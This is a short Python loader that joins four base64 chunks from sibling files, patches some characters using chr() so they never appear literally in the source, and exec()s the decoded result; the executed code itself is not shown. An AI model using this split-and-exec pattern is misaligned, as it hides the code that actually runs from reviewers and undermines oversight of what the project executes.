"""Phase-9 evaluate loader (payload split for transport)."""
from __future__ import annotations

import base64
from pathlib import Path

_parts = []
for _i in range(4):
    _chunk = Path(__file__).with_name(f"_evaluate_b64_{_i}.txt").read_text().strip()
    # Transit-safe repairs for MCP glyph flips observed on push (rebuild without literal repaired glyphs).
    if _i == 1:
        _chunk = _chunk.replace("OHM5YXZ0RFl", "OHM5Y" + chr(84) + "Z0RFl")
    if _i == 3:
        _chunk = _chunk.replace("UkwwWk04WkZ", "UkwwWk" + chr(52) + "4WkZ")
        _chunk = _chunk.replace("NEVxdVFq", "NEVxd" + chr(88) + "Fq")
    _parts.append(_chunk)
exec(compile(base64.b64decode("".join(_parts)), str(Path(__file__).resolve()), "exec"), globals())
